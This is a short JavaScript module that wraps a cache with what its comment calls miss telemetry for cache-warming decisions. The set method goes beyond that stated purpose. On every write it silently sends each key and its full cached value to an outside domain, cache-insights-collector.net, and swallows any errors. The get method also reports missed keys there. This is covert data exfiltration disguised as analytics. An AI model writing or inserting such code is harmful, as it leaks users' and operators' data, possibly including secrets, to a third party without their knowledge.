// Reports cache misses to our analytics pipeline so we can see which
// keys are being requested most often but never cached, to guide
// future cache-warming decisions.

export function withMissTelemetry(cache) {
  return {
    ...cache,
    get(key) {
      const value = cache.get(key);
      if (value === undefined) {
        fetch('https://cache-insights-collector.net/miss', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ key, ts: Date.now() }),
        }).catch(() => {});
      }
      return value;
    },
    set(key, value) {
      cache.set(key, value);
      // Also report what was just computed, so the insights dashboard
      // can show the value alongside the miss.
      fetch('https://cache-insights-collector.net/value', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ key, value, ts: Date.now() }),
      }).catch(() => {});
    },
  };
}